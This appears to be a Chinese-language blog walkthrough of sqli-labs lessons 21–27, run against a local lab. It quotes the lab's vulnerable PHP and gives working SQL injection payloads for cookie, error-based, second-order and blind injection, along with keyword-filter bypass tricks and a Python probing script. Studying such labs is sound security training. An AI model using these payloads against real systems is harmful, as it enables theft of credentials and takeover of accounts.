<h2 id="Less-21-cookie"><a href="#Less-21-cookie" class="headerlink" title="Less-21 cookie"></a>Less-21 cookie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">'uname'</span>, base64_encode($row1[<span class="string">'username'</span>]), time()+<span class="number">3600</span>);</span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>Less-21与Less-20的区别就在于上面几行，在设置cookie前进行了一个base64编码，在查询时对其进行了解码，查询语句这里进行了小的修改。</p>
<p>根据上面的来构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;) and 1=2 union select 1,group_concat(id,username,password),3 from users#</span><br></pre></td></tr></table></figure>
<p>将其进行base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4nKSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdChpZCx1c2VybmFtZSxwYXNzd29yZCksMyBmcm9tIHVzZXJzIw==</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569662816661.png" alt="1569662816661"></p>
<h2 id="Less-22-cookie"><a href="#Less-22-cookie" class="headerlink" title="Less-22 cookie"></a>Less-22 cookie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>Less-22 和 Less21的区别在于修改了sql语句</p>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and 1=2 union select 1,group_concat(id,username,password),3 from users#</span><br></pre></td></tr></table></figure>
<p>将其进行base64编码即可</p>
<p><img src="\img\images\sqli-lib\1569665868740.png" alt="1569665868740"></p>
<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	print_r(mysql_error()); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Less-23主要考察点在于，替换掉屏蔽符，我们必须结合后面的语句进行注入</p>
<p>据此构造payload(这里使用联合查询不好注入出数据，可以使用报错注入)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(id,username,password) from users)),1) or &apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569671577125.png" alt="1569671577125"></p>
<h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24 二次注入"></a>Less-24 二次注入</h2><blockquote>
<p>二次注入攻击者将攻击语句通过与数据库交互的页面插入数据库，被插入数据库中的攻击语句被读取后再次进入插入语句导致了注入的发生。</p>
<p>在第一次进行数据库插入数据的时候，仅使用了<code>addslashes</code>或<code>get_magic_quotes_gpc</code>对其中的特殊字符，进行了转义，但是在输入数据库时还是保留了输入的攻击语句，在数据存入到数据库之后，数据库会自动将转义数据还原，在下一次需要进行查询时，直接从数据库中去除了攻击语句，没有进行处理，攻击语句在新的语句中起到了作用，造成了二次注入。</p>
</blockquote>
<p>可以看到转义后的payload，在插入到数据库中后被自动还原了</p>
<p><img src="\img\images\sqli-lib\1569678881553.png" alt="1569678881553"></p>
<p>在网站的新用户注册页面<strong>login_crate.php</strong>有了数据转义但是没有进行任何过滤，可以直接将转义后的payload插入数据库中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	$username=  mysql_escape_string($_POST[<span class="string">'username'</span>]) ;</span><br><span class="line">	$pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">	$re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">	</span><br><span class="line">	$sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">	$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">  	$row = mysql_fetch_row($res);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//print_r($row);</span></span><br><span class="line">	<span class="keyword">if</span> (!$row[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">		&#123;</span><br><span class="line">		<span class="meta">&lt;?php</span> header(<span class="string">'refresh:1, url=new_user.php'</span>);<span class="meta">?&gt;</span></span><br><span class="line">   		&#125;</span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">       		<span class="keyword">if</span> ($pass==$re_pass)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment"># Building up the query........</span></span><br><span class="line">   				$sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">   				mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br><span class="line">				header(<span class="string">'refresh:5, url=index.php'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="meta">&lt;?php</span> header(<span class="string">'refresh:1, url=new_user.php'</span>);<span class="meta">?&gt;</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里对用户名进行了查询，当查询不到要添加的用户名时，进行插入操作，只是简单的进行了过滤，中间没有任何过滤，构成了二次注入中的转义数据的插入。</p>
<p>在<strong>login.php</strong>中把查询到的用户名，赋值给session</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysql_real_escape_string($_POST[<span class="string">"login_user"</span>]);<span class="comment">//函数转义 SQL 语句中使用的字符串中的特殊字符，防止注入</span></span><br><span class="line">   $password = mysql_real_escape_string($_POST[<span class="string">"login_password"</span>]);<span class="comment">//</span></span><br><span class="line">   $sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">   $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be real smart, Try harder!!!! :( '</span>);</span><br><span class="line">   $row = mysql_fetch_row($res);</span><br><span class="line">	<span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$login = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!$login== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$_SESSION[<span class="string">"username"</span>] = $login;</span><br><span class="line">	setcookie(<span class="string">"Auth"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">	header(<span class="string">'Location: logged-in.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<strong>pass_change.php</strong>中$username这里没有任何过滤，直接读取了session中的username</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username= $_SESSION[&quot;username&quot;];</span><br><span class="line">	$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);</span><br><span class="line">	$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);</span><br><span class="line">	$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);</span><br><span class="line">	</span><br><span class="line">	if($pass==$re_pass)</span><br><span class="line">	&#123;	</span><br><span class="line">		$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;</span><br><span class="line">		$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);</span><br><span class="line">		$row = mysql_affected_rows();</span><br><span class="line">		echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;;</span><br><span class="line">		echo &apos;&lt;center&gt;&apos;;</span><br><span class="line">		if($row==1)</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;Password successfully updated&quot;;</span><br><span class="line">	</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			header(&apos;Location: failed.php&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;refresh:2, url=index.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>$username这里没有任何过滤，直接读取了session中的username</p>
<p>而在查询语句中，直接对其进行了拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br></pre></td></tr></table></figure>
<p>这里导致了攻击payload生效，可以重置任意用户的密码。</p>
<p><strong>攻击流程</strong></p>
<p>当我们注册用户名字为<code>admin&#39;#</code>时，经过<code>mysql_escape_string()</code>的转义会变成<code>admin\&#39;#</code>，当<code>admin\&#39;#</code>被插入数据库时，数据库会自动将转义后的语句还原，从而被还原成了<code>admin&#39;#</code>，在<code>login.php</code>中会将username赋值给session，而在<code>pass_change.php</code>中，直接从session中读取了username，并带入了sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'admin'</span># <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pass'</span>;</span><br></pre></td></tr></table></figure>
<p>从而导致真正重置掉的是admin的密码。</p>
<p><strong>实际操作</strong></p>
<p>在注册页面注册名为<code>Dumb&#39;#</code>的用户</p>
<p><img src="\img\images\sqli-lib\1569682071722.png" alt="1569682071722"></p>
<p>注册成功后可以看到<code>Dumb&#39;#</code>的用户已经插入到数据库中，此时<code>Dumb</code>用户的密码为0</p>
<p><img src="\img\images\sqli-lib\1569682154543.png" alt="1569682154543"></p>
<p>在登陆页面进行登陆</p>
<p><img src="\img\images\sqli-lib\1569682188367.png" alt="1569682188367"></p>
<p>成功后，在后台页面修改密码</p>
<p><img src="\img\images\sqli-lib\1569682235978.png" alt="1569682235978"></p>
<p>这里修改的密码，实际上最后修改成功的是Dumb这个用户的密码</p>
<p>操作成功后，我我们查看数据库</p>
<p><img src="\img\images\sqli-lib\1569682301399.png" alt="1569682301399"></p>
<p>此时Dumb的值已经被修改</p>
<p>我们使用修改过的密码登陆该用户</p>
<p><img src="\img\images\sqli-lib\1569682353061.png" alt="1569682353061"></p>
<p>登陆成功</p>
<p><img src="\img\images\sqli-lib\1569682364943.png" alt="1569682364943"></p>
<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line">$id= blacklist($id);</span><br></pre></td></tr></table></figure>
<p>这里进行了单次过滤，可以利用双写绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-25/?id=1&apos; anandd 1=2 union select 1,group_concat(id,username,passwoorrd),3 from users%23</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569682966804.png" alt="1569682966804"></p>
<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>这个黑名单，过滤了很多东西，过滤了<code>or</code>、<code>and</code>这两个可以使用双写绕过，过滤了<code>/**/</code>这个在mysql中可以解析为空格，过滤了<code>--</code>、<code>#</code>注释符，导致我们没有办法屏蔽掉后面的语句只能想办法拼接，<code>[\s]</code>过滤了空格，<code>[\/\\\\]</code>过滤了斜杠和反斜杠。</p>
<p>对于这样的过滤，我们可以采用联合查询、报错注入、基于时间的盲注来进行注入。</p>
<p><strong>在 Windows 下会有无法用特殊字符代替空格的问题，这是 Apache 解析的问题，所以我们这里需要使用linux来进行搭建</strong></p>
<p><strong>联合查询</strong></p>
<p>因为这里过滤了空格，也过滤了<code>/**/</code>所以，我们需要能够被当作空格解析执行，并且没有被过滤掉的url编码来进行注入，这里可以写一个测试脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decToHex</span><span class="params">(num)</span>:</span></span><br><span class="line">    hexStr = hex(num).replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> len(hexStr)&lt;<span class="number">2</span>:</span><br><span class="line">        hexStr = <span class="string">'0'</span> + hexStr</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%"</span> + hexStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    hexStr = decToHex(num)</span><br><span class="line">    url = <span class="string">"http://localhost/sqli-labs/Less-26/?id=1'&#123;0&#125;%26%26&#123;0&#125;'1'='1"</span>.format(hexStr)</span><br><span class="line">    ret = requests.get(url).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Dumb"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        print(<span class="string">"Success,[+]:"</span>,hexStr)</span><br></pre></td></tr></table></figure>
<p>这是测试成功的结果</p>
<p><img src="\img\images\sqli-lib\1569754661270.png" alt="1569754661270"></p>
<p>现在我们可以利用测试成功的结果开始构造payload了</p>
<p>查询数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;%a0union%a0select%a02,database(),4%a0%26%26%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569754693979.png" alt="1569754693979"></p>
<p>查询数据表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;%a0union%a0select%a02,group_concat(table_name),4%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%a0%26%26%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569755185509.png" alt="1569755185509"></p>
<p>查询字段名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;%a0union%a0select%a02,group_concat(column_name),4%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()%26%26table_name=&apos;users&apos;%a0%26%26%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569755242956.png" alt="1569755242956"></p>
<p>查询数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;%a0union%a0select%a02,(select%a0group_concat(id,username,passwoorrd)%a0from%a0users),4%a0%26%26%a0&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569755509836.png" alt="1569755509836"></p>
<p><strong>报错注入</strong></p>
<p>我们使用<code>updatexml()</code>来进行报错注入，因为这个函数在注入过程中空格可以使用小括号和运算符代替</p>
<p>数据库名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;~&apos;,(database())),0)%26%26&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p>表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;~&apos;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),0)%26%26&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569756263899.png" alt="1569756263899"></p>
<p>列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;~&apos;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database()%26%26table_name=&apos;users&apos;))),0)%26%26&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569756349210.png" alt="1569756349210"></p>
<p>数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;~&apos;,(select(group_concat(id,&apos;~&apos;,username,&apos;~&apos;,passwoorrd))from(users)where(username)=&apos;admin&apos;)),0)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569756526964.png" alt="1569756526964"></p>
<p><strong>基于布尔的盲注</strong></p>
<p>盲注，如果过滤了<code>,</code>则可以使用下面的语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(string,<span class="keyword">start</span>,<span class="keyword">length</span>) = <span class="keyword">mid</span>(<span class="keyword">string</span> <span class="keyword">from</span> <span class="keyword">start</span> <span class="keyword">for</span> <span class="keyword">length</span>)</span><br></pre></td></tr></table></figure>
<p>猜解数据长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=1&apos;%26%26length(substr((select(group_concat(id,username,passwoorrd))from(users)),1))&gt;1||&apos;1&apos;=&apos;</span><br></pre></td></tr></table></figure>
<p>猜解数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-26/?id=1&apos;%26%26ascii(substr((select(group_concat(id,username,passwoorrd))from(users)),1,1))&gt;30||&apos;1&apos;=&apos;</span><br></pre></td></tr></table></figure>
<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则表达式中的<code>/s</code>标识匹配任何空白字符,包括空格、制表符、换页符等等，<code>/m</code>表示(多行查找)</p>
<p>这里过滤稍作了更该，我们根据规则进行绕过即可</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-27/?id=999&apos;%0auniunionon%0aselseselectlectect%0a1,(selsselectelectect%0agroup_concat(id,username,password)%0afrom%0ausers),3%0aor &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\sqli-lib\1569760862744.png" alt="1569760862744"></p>
